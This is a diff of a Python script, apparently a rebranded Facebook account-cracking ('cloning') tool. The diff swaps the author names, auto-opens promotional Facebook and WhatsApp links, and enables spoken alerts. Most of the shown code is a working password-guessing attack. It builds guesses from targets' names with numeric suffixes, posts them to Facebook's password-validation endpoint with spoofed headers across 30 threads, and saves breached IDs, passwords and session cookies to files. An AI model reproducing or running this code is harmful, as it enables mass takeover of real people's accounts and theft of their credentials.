@@ -14,15 +14,15 @@ from time import localtime as lt
 pretty.install()
 CON=sol()
 os.system("pkg install espeak")
- #------------------[ MANAS-Manas ]-------------------#
+ #------------------[ Tutul-King ]-------------------#
 import os, platform, time, sys
 print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
 time.sleep(5)
 os.system('clear')
-print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Done ✅")
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
 time.sleep(2)
-#os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
-#------------------[ MANAS-Manas ]-------------------#
+os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
+#------------------[ Tutul-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
@@ -107,48 +107,9 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
  
- #---------------PASS------------#
-
-#------------------[ GREETINGS ]-----------------#
-
-current_time = datetime.datetime.now()
-current_hour = current_time.hour
-if 5 <= current_hour < 12:
-    greeting = "GOOD MORNING   : "
-elif 12 <= current_hour < 17:
-    greeting = "GOOD AFTERNOON : "
-elif 17 <= current_hour < 20:
-    greeting = "GOOD EVENING   : "
-else:
-    greeting = "GOOD NIGHT     : "
-        
  
-#------------[APPLICATION CHECKER-----------#
-def cek_apk(session,coki):
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] {BLUE}SORRY NO ACTIVE APKS %s'%(N,M,N,M,N))
-    else:
-        print(f'\r[%s] {BLUE}YOUR ACTIVE APPLICATION DETAILS:'%(H))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] {BLUE}SORRY NO EXPIRED APKS %s'%(N,M,N,M,N))
-    else:
-        print(f'\r[%s] {BLUE}YOUR EXPIRED APPLICATION DETAILS:'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-loop = 0
-oks = []
-cps = []
-#------------[ MANAS- ]--------------#
+
+#------------[ Tutul- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -224,26 +185,39 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/MANAS.Manas.Ok.Bro')
+   # os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
+os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
-███╗   ███╗ █████╗ ███╗   ██╗ █████╗ ███████╗    
-████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝    
-██╔████╔██║███████║██╔██╗ ██║███████║███████╗    
-██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══██║╚════██║    
-██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██║███████║    
-╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝   
------------------------------------------ """
+
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ██ \033[0;92m     ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██   \033[0;92m   ║
+║\033[0;91m    ██ \033[0;92m    ██████\033[0;91m     ██\033[0;92m     ██████\033[0;91m  ███████\033[0;92m ║
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
+╠══[Author                   • \33[1;38mMR-TUTUL ]\33[1;38m     ║\033[1;31m 
+╠══[Facebook                 • Tutul King ]   ║  \033[1;97m  
+╠══[Github                   • \33[1;38mTutul-King ]   ║\33[1;34m   
+╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
+╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
+╠══[VERSION                  • 4.7 ]          ║\033[1;35m 
+\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
-#os.system#('espeak -a 300 " Welcome,   to,  Manas,  Dada,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  Tutul,  King,  Tools"')
 pass
  
  
@@ -260,7 +234,7 @@ def login():
         except KeyError:
             login_lagi334()
         except requests.exceptions.ConnectionError:
-            print('\033[0;97m--------------------')
+            print('\033[0;97m=================')
             animation(' [×] NO INTERNET CONNECTION DETECTED')
             exit()
     except IOError:
@@ -283,7 +257,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        os.system("python v3.py")
+        os.system("python nono.py")
         exit()
 
 #------------------[ MENU ]----------------#
@@ -299,31 +273,31 @@ def menu():
     print(logo)
     print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
-    print('\033[0;97m-------------------------------------------------------')
+    print('\033[0;97m===============================================')
     print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mFILE CLONING         """)
     print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mCONTACT WITH ADMIN""")
     print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
-    print('\033[0;97m---------------------')
-    MANAS = input('\x1b[1;92m[+] CHOOSE: ')
-    if MANAS in ['111']:
+    print('\033[0;97m=================')
+    TUTUL = input('\x1b[1;92m[+] CHOOSE: ')
+    if TUTUL in ['111']:
         login()
         dump_massal()
-    elif MANAS in ['1']:
+    elif TUTUL in ['1']:
         crack_file()
-    elif MANAS in ['2','02']:
+    elif TUTUL in ['2','02']:
         os.system('xdg-open https://wa.me/+8801608843956')
-        os.system("python v3.py")
-    elif MANAS in ['3','03']:
+        os.system("python nono.py")
+    elif TUTUL in ['3','03']:
         result()
-    elif MANAS in ['0']:
+    elif TUTUL in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
-        print('\033[0;97m---------------------')
+        print('\033[0;97m=================')
         animation(' [×] DONE EXIT ')
         exit()
     else:
-        print('\033[0;97m---------------------')
+        print('\033[0;97m=================')
         animation(' [×] SELECT CORRECTLY ')
         back()
  
@@ -335,17 +309,17 @@ def result():
     print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
     print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
     print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
-    print('\033[0;91m---------------------')
+    print('\033[0;91m==================')
     kz = input(' \033[97;1m[\033[92;1m•\033[97;1m]CHOOSE : ')
     if kz in ['1','01']:
         try:vin = os.listdir('CP')
         except FileNotFoundError:
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
             time.sleep(3)
             back()
         if len(vin)==0:
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO CP RESULTS FOUND ')
             time.sleep(2)
             back()
@@ -360,22 +334,22 @@ def result():
                     nom = ''+str(cih)
                     lol.update({str(cih):str(isi)})
                     lol.update({nom:str(isi)})
-                    print('\033[0;91m---------------------')
+                    print('\033[0;91m==================')
                     print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                 else:
                     lol.update({str(cih):str(isi)})
                     print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             geeh = input(' \033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             try:geh = lol[geeh]
             except KeyError:
-                print('\033[0;91m---------------------')
+                print('\033[0;91m==================')
                 animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                 exit()
             try:lin = open('CP/'+geh,'r').read().splitlines()
             except:
-                print('\033[0;91m---------------------')
+                print('\033[0;91m==================')
                 animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                 time.sleep(2)
                 back()
@@ -384,18 +358,18 @@ def result():
                 cpkuni=lin[nocp].split('|')
                 print(f' \033[97;1m[\033[92;1m•\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                 nocp +=1
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
             back()
     elif kz in ['2','02']:
         try:vin = os.listdir('OK')
         except FileNotFoundError:
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
             time.sleep(2)
             back()
         if len(vin)==0:
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
             time.sleep(2)
             back()
@@ -407,7 +381,7 @@ def result():
                 except:continue
                 cih+=1
                 if cih<100:
-                    print('\033[0;91m---------------------')
+                    print('\033[0;91m==================')
                     nom = ''+str(cih)
                     lol.update({str(cih):str(isi)})
                     lol.update({nom:str(isi)})
@@ -415,17 +389,17 @@ def result():
                 else:
                     lol.update({str(cih):str(isi)})
                     print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             geeh = input(' \x1b[1;92m [•] CHOOSE : ')
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             try:geh = lol[geeh]
             except KeyError:
-                print('\033[0;91m---------------------')
+                print('\033[0;91m==================')
                 animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                 exit()
             try:lin = open('OK/'+geh,'r').read().splitlines()
             except:
-                print('\033[0;91m---------------------')
+                print('\033[0;91m==================')
                 animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                 time.sleep(2)
                 back()
@@ -434,13 +408,13 @@ def result():
                 cpkuni=lin[nocp].split('|')
                 print(f'\033[97;1m[\033[92;1m•\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                 nocp +=1
-            print('\033[0;91m---------------------')
+            print('\033[0;91m==================')
             input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
             back()
     elif kz in ['0','00']:
         back()
     else:
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND IN MENU')
         exit()
  
@@ -453,15 +427,15 @@ def dump_massal():
     except IOError:
         exit()
     try:
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         jum = int(input(' \033[97;1m[\033[92;1m•\033[97;1m] ENTER TARGET AMOUNT  : '))
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
     except ValueError:
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         animation(' [×] INVALID OPTION ')
         exit()
     if jum<1 or jum>100000000:
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         animation(' [×] TRY AGAIN ')
         exit()
     ses=requests.Session()
@@ -482,18 +456,18 @@ def dump_massal():
         except (KeyError,IOError):
             pass
         except requests.exceptions.ConnectionError:
-            print('\033[0;91m-------------------')
+            print('\033[0;91m==================')
             animation(' [×] TRY AGAIN ')
             os.system('clear')
     try:
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         print(f' \033[97;1m[\033[92;1m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
         setting()
     except requests.exceptions.ConnectionError:
         print(f'{u}')
         back()
     except (KeyError,IOError):
-        print('\033[0;91m---------------------')
+        print('\033[0;91m==================')
         animation(" [×] DUMP ID FAILED ")
         time.sleep(3)
         back()
@@ -501,13 +475,13 @@ def dump_massal():
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 def crack_file():
-    print('\033[0;91m---------------------')
-  #  os.system#('espeak -a 300 " your file name"')
-    print('\033[1;32m[ Put File Example:  /sdcard/FILE.txt  Etc...]')
-    o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPUT FILE NAME :\033[92;1m ')
+    print('\033[0;91m==================')
+    os.system('espeak -a 300 " your file name"')
+    print('\033[1;32m[ Put File Example:  /sdcard/king.txt  Etc...]')
+    o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPut FILE NAME :\033[92;1m ')
     try:lin = open(o).read().splitlines()
     except:
-        print('\033[0;91m-------------------')
+        print('\033[0;91m==================')
         animation(' [×] FILE NOT FOUND')
         time.sleep(2)
         back()
@@ -544,13 +518,13 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print('\033[0;91m---------------------')
-    print('\033[0;91m---------------------')
+    print('\033[0;91m==================')
+    print('\033[0;91m==================')
     print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
-    print('\033[0;91m---------------------')
+    print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/MANAS.Manas.Ok.Bro")
+    #os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -569,8 +543,9 @@ def passwrd():
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
     print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
     print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
     print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
-    print('\033[0;97m-----------------------------------------------------')
+    print('\033[0;97m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -602,23 +577,9 @@ def passwrd():
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(nmf+'12')
-                    pwv.append(nmf+'123')
-                    pwv.append(nmf+'1234')
-                    pwv.append(nmf+'12345')
-                    pwv.append(nmf+'@12')
-                    pwv.append(nmf+'@123')
-                    pwv.append(nmf+'@1234')
-                    pwv.append(nmf+'@12345')
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'1122')
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -633,13 +594,13 @@ def passwrd():
                 pool.submit(crackfree,idf,pwv)
             else:
                 pool.submit(crackfree,idf,pwv)
-    print('\n\033[1;37m-----------------------------------------')
+    print('\n\033[1;37m===================================')
     print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
-    print('\n\033[1;37m-----------------------------------------')
+    print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
-    os.system("python v3.py")
+    os.system("python nono.py")
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
@@ -647,7 +608,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r {P}[MANAS]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[Tutul•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -664,18 +625,18 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-            #   print(f#\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
-                #os.system#('espeak -a 300 " Cp,"')
+                print(f'\r\033[0;94m[Tutul-Cp] {idf} • {pw}')
+                os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' | '+pw)
+                akun.append(idf+' • '+pw)
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[MANAS-Ok] {idf} | {pw}\n\033[0;93m[❤️]= COOKIES • \033[0;92m{kuki} ')
-               #$ os.system(#espeak -a 300 " MANAS,  Ok,  id"')
+                print(f'\r\033[0;92m[Tutul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                os.system('espeak -a 300 " Tutul,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -689,7 +650,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r {P}[MANAS]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[Adnan-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -706,8 +667,8 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-               print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
-               # os.system#('espeak -a 300 " Cp,"')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Adnan-Cp] {idf} • {pw}')
+                os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -716,8 +677,8 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                #os.system#('espeak -a 300 " Ok,  MANAS,  id"')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Adnan-Ok] {idf} • {pw} ')
+                os.system('espeak -a 300 " Ok,  Adnan,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
